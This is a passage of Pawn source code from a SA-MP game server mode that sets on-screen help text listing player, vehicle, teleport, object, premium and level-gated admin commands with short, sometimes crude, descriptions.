			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Open selection mode for an attached object~n~\
			Toggle attached objects visibility~n~\
			Remove nearby fire~n~\
			View server statistics~n~\
			Animations menu\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Have a wee-wee~n~\
			View a list of possible animations~n~\
			Stick 'em up, pardner~n~\
			Stop your current animation\
			\
			");
		}
		case TD_MODE_VEHI1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Vehicle Cmds ~p~P1~n~~n~~y~\
			/V (VEHICLE)~n~\
			/VX (VEHICLEX)~n~\
			/CC (CHANGECAR)~n~\
			/VDESTROY~n~\
			/VSEL~n~\
			/TOW~n~\
			/FIX~n~\
			/SPRAY~n~\
			/TUNE~n~\
			/NOS\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Spawn a vehicle~n~\
			Spawn inside a vehicle~n~\
			Change your vehicle~n~\
			Destroy a vehicle~n~\
			Scroll through available vehicle colours\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Drag a vehicle~n~\
			Replenish your car health to maximum~n~\
			Repair your vehicle and visual damage~n~\
			Tune car~n~\
			Add 10x NOS\
			");
		}
		case TD_MODE_VEHI2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Vehicle Cmds ~p~P2~n~~n~~y~\
			/DELNOS~n~\
			/EJECT~n~\
			/CARCOLOUR~n~\
			/SETVEH(ICLE)~n~\
			/TIRES~n~\
			/NUMBERPLATE~n~\
			/MS (MOVESPEED)~n~\
			/SS (SETSPEED)~n~\
			/SR (SETROTATION)~n~\
			/PANELS\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Remove NOS~n~\
			Remove player from car~n~\
			Set car colour~n~\
			Set vehicle attributes~n~\
			Pop tyres of your vehicle\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Customize your numberplate~n~\
			Speed modification~n~\
			Set speed power~n~\
			Set rotation speed~n~\
			Customize your vehicle (wrecked, ...)\
			");
		}
		case TD_MODE_VEHI3:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Vehicle Cmds ~p~P3~n~~n~~y~\
			/DOORS~n~\
			/LIGHTS~n~\
			/L (LOCK)~n~\
			/UL (UNLOCK)~n~\
			/FLIP~n~\
			/RAMPS~n~\
			/AF (ANTIFALL)~n~\
			/WRECK~n~\
			/VEHICLES~n~\
			/VEHICLES2\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Customize your doors (cracked etc..)~n~\
			Set status of your vehicle lights~n~\
			Lock your vehicle~n~\
			Unlock your vehicle~n~\
			Reorient your vehicle\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Toggle ramps (use KEY_SPRINT)~n~\
			Toggle anti-fall~n~\
			Destroy your vehicle visually~n~\
			Count vehicles spawned by players~n~\
			Count ALL vehicles on the server\
			");
		}
		case TD_MODE_TELE1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Teleport Cmds ~p~P1~n~~n~~y~\
			/LS~n~\
			/SF~n~\
			/LV~n~\
			/GOTO~n~\
			/ITELEPORTS~n~\
			/BURG~n~\
			/GOV~n~\
			/GIRL~n~\
			/GYM~n~\
			/STRIP\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Teleport to Los Santos~n~\
			Teleport to San Fierro~n~\
			Teleport to Las Venturas~n~\
			Teleport to another player~n~\
			Teleports to interior places\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Teleports to house interiors~n~\
			Teleports to government buildings~n~\
			Teleports to CJ girlfriend's buildings~n~\
			List of gym interiors~n~\
			List of strip club interiors\
			");
		}
		case TD_MODE_TELE2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Teleport Cmds ~p~P2~n~~n~~y~\
			/POL~n~\
			/SPAWN~n~\
			/LOADPOS~n~\
			/UNSET~n~\
			/SETSPAWN~n~\
			/SETLOC~n~\
			~n~\
			~n~\
			~n~\
			\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			List of police interiors\
			Set your spawn location(s)~n~\
			Load spawn location~n~\
			Unset spawn location(s)~n~\
			Change default spawn location\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Set your position with coordinates~n~\
            ~n~\
            ~n~\
            ~n~\
            \
			");
		}
		case TD_MODE_OBJE1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Object Cmds ~p~P1~n~~n~~y~\
			/CM (CREATEMAP)~n~\
			/LM (LOADMAP)~n~\
			/UNLOADMAP~n~\
			/VLM (VLOADMAP)~n~\
			/VUNLOADMAP~n~\
			/EM (EDITMAP)~n~\
			/EMQ (EDITMAPQ)~n~\
			/MAPPASS~n~\
			/VIEWPASS~n~\
			/MH (MAPHELP)\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Create a map~n~\
			Load a map~n~\
			Unload a map~n~\
			Load a map in view-only mode~n~\
			Unload a map in view only mode\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Edit an existing map~n~\
			Stop editing a map~n~\
			Change the password of a map~n~\
			View the map password~n~\
			Invite a player for mapping assistance\
			");
		}
		case TD_MODE_OBJE2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Object Cmds ~p~P2~n~~n~~y~\
			/OC (OCREATE)~n~\
			/OD (ODESTROY)~n~\
			/OE (OEDIT)~n~\
			/OS (OSAVE)~n~\
			/OX~n~\
			/OY~n~\
			/OZ~n~\
			/RX~n~\
			/RY~n~\
			/RZ\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Create an object~n~\
			Destroy an object~n~\
			Edit an existing object~n~\
			Save the current object~n~\
			Move the object in the x-axis\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Move the object in the y-axis~n~\
			Move the object in the z-axis~n~\
			Rotate an object along its x-axis~n~\
			Rotate an object along its y-axis~n~\
			Rotate an object along its z-axis\
			");
		}
		case TD_MODE_OBJE3:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Object Cmds ~p~P3~n~~n~~y~\
			/GO~n~\
			/OSELECT~n~\
			/OCHANGE~n~\
			/OBJECTS~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Teleport to a map object~n~\
			Open selection mode for a map object~n~\
			Replace an object with another model~n~\
			Count all the objects on the server~n~\
			\
			");

			TextDrawSetString(pmsg4[playerid], "\
            ~n~\
            ~n~\
            ~n~\
            ~n~\
            \
			");
		}
		case TD_MODE_MISC1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Misc Cmds ~p~P1~n~~n~~y~\
			/TEST~n~\
			/JETPACK~n~\
			/FLY~n~\
			/CSEL~n~\
			/W (WEATHER)~n~\
			/T (TIME)~n~\
			/WSEL~n~\
			/W2 (WEAPON)~n~\
			/AFK~n~\
			/BACK\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Are you still connected to the server?~n~\
			Spawn a jetpack~n~\
			First-person camera control~n~\
			Scroll through camera angles~n~\
			Set your own weather\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Scroll through available weathers~n~\
			Set your own time~n~\
			Spawn a weapon~n~\
			Teleports you to the AFK tower~n~\
			Removes you from the AFK tower\
			");
		}
		case TD_MODE_MISC2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Misc Cmds ~p~P2~n~~n~~y~\
			/AFKLIST~n~\
			/DRUNK~n~\
			/LSD~n~\
			/VOTE~n~\
			/HEALTH~n~\
			/ARMOUR~n~\
			/ME~n~\
			/BU (BUBBLE)~n~\
			/SPE (SPECIAL)~n~\
			/REMOVE\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Lists players who are AFK~n~\
			Set your drunk level~n~\
			Get HIGH AS FUCK~n~\
			Vote in a poll~n~\
			Replenish your health to maximum\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Replenish your armour to maximum~n~\
			Do and action from the third person~n~\
			Display hovering text to other players~n~\
			View a list of special animations~n~\
			Disarm yourself of weapons\
			");
		}
		case TD_MODE_MISC3:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Misc Cmds ~p~P3~n~~n~~y~\
			/F~n~\
			/UF~n~\
			/GI (GETINFO)~n~\
			/SPEC~n~\
			/RUN~n~\
			/SKATE~n~\
			/SWIM~n~\
			/TURNGOTO~n~\
			/SKILL~n~\
			/SOUND\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Freeze your character in position~n~\
			Unfreeze your character~n~\
			Get information about a player~n~\
			Observe a player from their perspective~n~\
			List of running styles\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Enable skating~n~\
			Enable swimming~n~\
			Toggle allowing players to /goto you~n~\
			Set weapon skill~n~\
			Play a background song\
			");
		}
		case TD_MODE_MISC4:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Misc Cmds ~p~P4~n~~n~~y~\
			/RADIOOFF~n~\
			/NEWS~n~\
			/LISTENERS(2)~n~\
			/JOIN~n~\
			/LEAVE~n~\
			/READY~n~\
			/JAILLIST~n~\
			~n~\
			~n~\
			\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Disable radio streaming~n~\
			View latest news~n~\
			View radio listeners~n~\
			Join the announced race~n~\
			Leave the current race\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Player is ready to start.~n~\
			View current jail inmates~n~\
			~n~\
			~n~\
			\
			");
		}
		case TD_MODE_PREM1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Premium Cmds ~p~P1~n~~n~~y~\
			/SKIPACLEAR~n~\
			/ACLEAR~n~\
			/JCLEAR~n~\
			/VCLEAR~n~\
			/VECLEAR~n~\
			/OCLEAR~n~\
			/VLIGHTS (DAYTIME)~n~\
			/PCOLOUR~n~\
			/BU2 (BUBBLE2)~n~\
			/LA (LABEL)\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Skip automatic clear system~n~\
			Clear all objects, vehicles, maps, jetpacks~n~\
			Clear all jetpacks~n~\
			Clear all vehicles (ALWAYS VOTE!)~n~\
			Clear all empty vehicles (ALWAYS VOTE!)\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Clear all loaded maps (ALWAYS VOTE!)~n~\
			Enable flashing vehicle lights~n~\
			Set the colour of your text~n~\
			Display hovering text with expire time~n~\
			Create a label with text\
			");
		}
		case TD_MODE_PREM2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Premium Cmds ~p~P2~n~~n~~y~\
			/BRING~n~\
			/STREW~n~\
			/PAPC~n~\
			/PACC~n~\
			/APC~n~\
			/ACC~n~\
			/ODROP~n~\
			/COUNTDOWN~n~\
			/REMOVESTICK~n~\
			/COPYSTICK\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Bring a player to you (ALWAYS ASK!)~n~\
			Drive on floating roads, woo!~n~\
			Changes your name's colour~n~\
			Changes your vehicle's colour~n~\
			Changes player colours server-wide\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Changes vehicle colours server-wide~n~\
			Drops an object on someone~n~\
			Countdown~n~\
			Remove someones osticks (abusers)~n~\
			Copy another player's (p)osticks\
			");
		}
		case TD_MODE_PREM3:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Premium Cmds ~p~P3~n~~n~~y~\
			/SETSKIN~n~\
			/GIVEMONEY~n~\
			/SETMONEY~n~\
			/VBEACH~n~\
			/MAP~n~\
			/OBJECT~n~\
			/SC~n~\
			/SP~n~\
			/RACEHELP~n~\
			/BUILDHELP\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Set a player's skin~n~\
			Give a player money~n~\
			Set a player's money amount~n~\
			Load the VIP beach map~n~\
			Manage map-object\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Manage any server-object~n~\
			Save your current vehicle~n~\
			Bring your saved vehicle~n~\
			Read more about loading races~n~\
			Read more about building races~n~\
			");
		}
		case TD_MODE_PREM4:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Premium Cmds ~p~P4~n~~n~~y~\
			/BUILDRACE~n~\
			/CP~n~\
			/SCP~n~\
			/RCP~n~\
			/MCP~n~\
			/DCP~n~\
			/CLEARRACE~n~\
			/EDITRACE~n~\
			/SAVERACE~n~\
			/SETLAPS\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Start building a new race (suprising!)~n~\
			Add a checkpoint~n~\
			Select a checkpoint~n~\
			Replace the current checkpoint~n~\
			Move the selected checkpoint\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Delete the selected waypoint~n~\
			Clear the current (new) race.~n~\
			Load an existing race~n~\
			Save the checkpoints to a file~n~\
			Set amount of laps to drive\
			");
		}
		case TD_MODE_PREM5:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Premium Cmds ~p~P5~n~~n~~y~\
			/RACEMODE~n~\
			/LOADRACE~n~\
			/STARTRACE~n~\
			/ENDRACE~n~\
			/BESTLAP~n~\
			/BESTRACE~n~\
			/DELETERACE~n~\
			/AIRRACE~n~\
			/CPSIZE~n~\
			/PRIZEMODE\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Set the current racemode~n~\
			Load a race from file~n~\
			Start a loaded race~n~\
			Complete the current race~n~\
			Display best lap time for the race\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Display best race time for the race~n~\
			Remove the race from disk~n~\
			Change checkpoints to air-mode~n~\
			Changes the checkpoint size~n~\
			Set the prize mode of a race\
			");
		}
		case TD_MODE_PREM6:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Premium Cmds ~p~P6~n~~n~~y~\
			/SETPRIZE~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			~n~\
			\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Set the prize of a race~n~\
			~n~\
			~n~\
			~n~\
			\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~~n~\
			~n~\
			~n~\
			~n~\
			\
			");
		}
		case TD_MODE_ADMI1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Admin Cmds ~p~P1~n~~n~~y~\
			/VMDESTROY~n~\
			/OSEL~n~\
			/CLOGIN~n~\
			/CLOGOUT~n~\
			/MAPINFO~n~\
			/MAPS~n~\
			/AHUT~n~\
			/AAIRPORT~n~\
			/AMANSION~n~\
			/GETID\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Destroy all vehicles of a model~n~\
			Scroll through available objects~n~\
			Login as clone from an admin account~n~\
			Logout of~n~\
			Get information about a map\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~View maps currently loaded~n~\
			Load the admin hut map~n~\
			Load the admin airport map~n~\
			Load the admin mansion map~n~\
			Get object attributes from your map\
			");
		}
		case TD_MODE_ADMI2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Admin Cmds ~p~P2~n~~n~~y~\
			/SETCOLOURS~n~\
			/RESETANDROMADA~n~\
			/RESETRR~n~\
			/RESETDERBY~n~\
			/RESETGROUP~n~\
			/RESETCC~n~\
			/SETT (SETTIME)~n~\
			/SETW (SETWEATHER~n~\
			/SLAP~n~\
			/HIDE\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Toggle usage of /pcolour~n~\
			Reset the Andromada entry checkpoint~n~\
			Reset the Russian Roulette minigame~n~\
			Reset the Derby minigame~n~\
			Reset all group chats\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Reset the Copchase minigame~n~\
			Set time of server for all players~n~\
			Set weather of server for all players~n~\
			Slap a player like a bitch~n~\
			Toggle visibility of your admin status\
			");
		}
		case TD_MODE_ADMI3:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Admin Cmds ~p~P3~n~~n~~y~\
			/SAY~n~\
			/ANNOUNCE~n~\
			/WARN~n~\
			/GOTOSEAT~n~\
			/MINIGUNS~n~\
			/CLEAR~n~\
			/TOGGLEMSG~n~\
			/GIVEWEAPON~n~\
			/PANNOUNCE~n~\
			/CANNOUNCE\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Talk as an admin~n~\
			Announce something to all players~n~\
			Warn a player for rulebreaking~n~\
			Teleport into somebody's vehicle~n~\
			List all players with a minigun\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Clear the chatbox~n~\
			Toggle admin messages~n~\
			Give a weapon to a play~n~\
			Announce to a specific player~n~\
			Announce to players without group\
			");
		}
		case TD_MODE_ADMI4:
		{
		    if (IsPlayerAdminLevel(playerid, 2))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P4~n~~n~~y~\
				/ADVERT~n~\
				/SETINTERIOR~n~\
				/FREEZE~n~\
				/UNFREEZE~n~\
				/JAIL~n~\
				/UNJAIL~n~\
				/MUTE~n~\
				/UNMUTE~n~\
				/KNIFE~n~\
				/UNLOCKALL\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Advert message in the text chat~n~\
				Set a player's interior~n~\
				Freeze a player~n~\
				Unfreeze a player~n~\
				Jail a player\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Unjail a player~n~\
				Mute a player or global chat~n~\
				Unmute a player or global chat~n~\
				Knife a player~n~\
				Unlock a specific vehicle or all vehicles\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P4~n~~n~~y~\
				/ADVERT~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Advert message in the text chat~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI5:
		{
			if (IsPlayerAdminLevel(playerid, 3))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P5~n~~n~~y~\
				/KICK~n~\
				/DISARM~n~\
				/SETWORLD~n~\
				/FORCESPAWN~n~\
				/FORCECLASS~n~\
				/FORCEMAP~n~\
				/ASAY~n~\
				/SETHEALTH~n~\
				/SETARMOUR~n~\
				/CARHEALTH\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Kick a player from the server~n~\
				Remove all weapons from a player~n~\
				Set a player's world~n~\
				Force a player to spawn~n~\
				Force a player to class selection\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Force a map to unload~n~\
				Print a message to the chatbox~n~\
				Set a player's health~n~\
				Set a player's armour~n~\
				Set the damage level of a player's car\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P5~n~~n~~y~\
				/KICK~n~\
				/DISARM~n~\
				/SETWORLD~n~\
				/FORCESPAWN~n~\
				/FORCECLASS~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Kick a player from the server~n~\
				Remove all weapons from a player~n~\
				Set a player's world~n~\
				Force a player to spawn~n~\
				Force a player to class selection\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Force a map to unload~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI6:
		{
			if (IsPlayerAdminLevel(playerid, 3))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P6~n~~n~~y~\
				/SETGOD~n~\
				/JOINCREW~n~\
				/LEAVECREW~n~\
				/STRIKE~n~\
				/CW (CLEARWARNINGS)~n~\
				/AKILL~n~\
				/EXPLODE~n~\
				/BIGBANG~n~\
				/FORCESAY~n~\
				/FORCEIRC\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Toggle server-wide /god~n~\
				Join a group without an invite~n~\
				Leave a group~n~\
				Strike a player with lightning~n~\
				Remove a player's warnings\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Kill a player~n~\
				BOOM~n~\
				BOOM x2~n~\
				Force a player to say something~n~\
				Force an IRC user to say something\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P6~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI7:
		{
			if (IsPlayerAdminLevel(playerid, 3))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P7~n~~n~~y~\
				/BLOCK~n~\
				/UNBLOCK~n~\
				/BAN~n~\
				/INFO~n~\
				/IPMATCH~n~\
				/SETTAGS~n~\
				/SETGOTO~n~\
				/SETCHAT~n~\
				/AEJECT~n~\
				/HOSTMATCH\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Block a player's commands~n~\
				Unblock a player's commands~n~\
				Ban a player from the server~n~\
				Get connection information for a player~n~\
				Search for names matching an IP\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Toggle server-wide player tags~n~\
				Toggle server-wide goto~n~\
				Toggle server-wide coloured chat~n~\
				Eject someone from your vehicle~n~\
				Search for names matching a host\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P7~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI8:
		{
			if (IsPlayerAdminLevel(playerid, 4))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P8~n~~n~~y~\
				/NAMEMATCH~n~\
				/NAMEMATCH2~n~\
				/CONVERT~n~\
				/CLEARMAP~n~\
				/SETMAP~n~\
				/MYMAP~n~\
				/EARTHQUAKE~n~\
				/PILL~n~\
				/SETG (SETGRAVITY)~n~\
				/SETDRUNK\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Search for names [begins with name]~n~\
				Search for names [contains name]~n~\
				Convert and export a map~n~\
				Empty all objects from a map~n~\
				Set your map\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Get your map's ID~n~\
				APOCALYPSE 2012~n~\
				A dose of happiness~n~\
				Set server-wide gravity~n~\
				Set server-wide drunk level\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P8~n~~n~~y~\
				/NAMEMATCH~n~\
				/NAMEMATCH2~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
			 	~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Search for names [begins with name]~n~\
				Search for names [contains name]~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI9:
		{
			if (IsPlayerAdminLevel(playerid, 4))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P9~n~~n~~y~\
				/BIGBANG2~n~\
				/PWN~n~\
				/UNPWN~n~\
				/FORCECMD~n~\
				/FORCEANIM~n~\
				/FORCESANIM~n~\
				/FORCESEAT~n~\
				/FORCEPOSTICK~n~\
				/FORCEPOSTICK2~n~\
				/GMX\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				BOOM x2~n~\
				Block, mute and jail a player~n~\
				Unblock, unmute and unjail a player~n~\
				Force a player to do a command~n~\
				Force a looped animation on a player\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Force a player to do an animation~n~\
				Force a player into your vehicle~n~\
				Force a player to apply a postick~n~\
				Force postick on players within range~n~\
				Restart the gamemode\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P9~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI10:
		{
			if (IsPlayerAdminLevel(playerid, 4))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P10~n~~n~~y~\
				/POO~n~\
				/SETNAME~n~\
				/PLAY~n~\
				/PAUSE~n~\
				/RESUME~n~\
				/SPLAY~n~\
				/FSETNAME~n~\
				/MOTD~n~\
				/ADDTELE~n~\
				/DERBYHELP\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Magic based excretion~n~\
				Set a player's name~n~\
				Play an URL stream to xAudio listeners~n~\
				Pause the URL stream on xAudio~n~\
				Resume the URL stream on xAudio\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Stop the URL stream to xAudio listeners~n~\
				Fake-disconnect and change name~n~\
				Message Of The Day~n~\
				Add a new teleportation for ptele~n~\
				Read information regarding the derby\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P10~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI11:
		{
			if (IsPlayerAdminLevel(playerid, 4))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P11~n~~n~~y~\
				/ADDDERBY~n~\
				/SETDVEH~n~\
				/SETDMODE~n~\
				/SETDHEIGHT~n~\
				/SETDSPAWN~n~\
				/SETDCENTER~n~\
				/SETDMAP~n~\
				/DELDSPAWN~n~\
				/SETEVENTS~n~\
				/LOCKEVENT\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Add a new derby to the database~n~\
				Set the vehicle for a derby~n~\
				Set the play mode of a derby~n~\
				Set the fall-off height for a derby~n~\
				Set a spawn for a derby\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Set the center of a map for a derby~n~\
				Set a map for a derby~n~\
				Delete a spawn in derby~n~\
				Disable server-wide events~n~\
				Lock server-wide events for non-vips\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P11~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI12:
		{
			if (IsPlayerAdminLevel(playerid, 5))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P12~n~~n~~y~\
				/FORCECMDB~n~\
				/FORCEANIMB~n~\
				/FORCESANIMB~n~\
				/FORCEDEATH~n~\
				/PLAY2~n~\
				/FLASH~n~\
				/SETVIP~n~\
				/REMOVEVIP~n~\
				/SETADMIN~n~\
				/REMOVEADMIN\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Force a bot to perform a command~n~\
				Force a looped animation on bots~n~\
				Force a bot to perform an animation~n~\
				Force a player to \"die\"~n~\
				Stream audio over SA-MP\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~WTF IS HAPPENING~n~\
				Promote a player to VIP~n~\
				Demote a VIP to player~n~\
				Promote a player or VIP to admin~n~\
				Demote an admin to player\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P12~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
		case TD_MODE_ADMI13:
		{
			if (IsPlayerAdminLevel(playerid, 5))
		    {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P13~n~~n~~y~\
				/SETLEVEL~n~\
				/CONNECT~n~\
